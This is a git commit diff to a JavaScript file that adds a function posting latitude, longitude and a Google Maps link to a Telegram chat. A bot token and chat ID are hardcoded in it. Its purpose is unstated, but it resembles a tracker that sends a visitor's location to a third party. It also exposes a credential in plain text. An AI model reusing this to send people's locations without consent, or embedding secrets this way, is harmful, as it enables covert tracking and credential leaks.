effdfae4cb5df2fa7e0e49bc1fd0ba7c906cc9ec
Dhruv <parmardhruv097@gmail.com>
2025-05-21 15:36:24 +0530

    Update main.js

--- main.js
+++ main.js
@@ -1,2 +1,23 @@
 const botToken = "7607952206:AAEssXN2JHqnV9AATiQQj6ga8if3PmYZ_Uc";  // From @BotFather
 const chatId = "6255459316";      // From @userinfobot
+function sendToTelegram(lat, lon) {
+  const botToken = "7607952206:AAEssXN2JHqnV9AATiQQj6ga8if3PmYZ_Uc";
+  const chatId = "6255459316";
+  const message = `New location:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`;
+
+  console.log("Sending to Telegram:", message); // DEBUG
+
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message
+    })
+  })
+  .then(res => res.json())
+  .then(data => console.log("Telegram response:", data))
+  .catch(err => console.error("Telegram error:", err));
+}
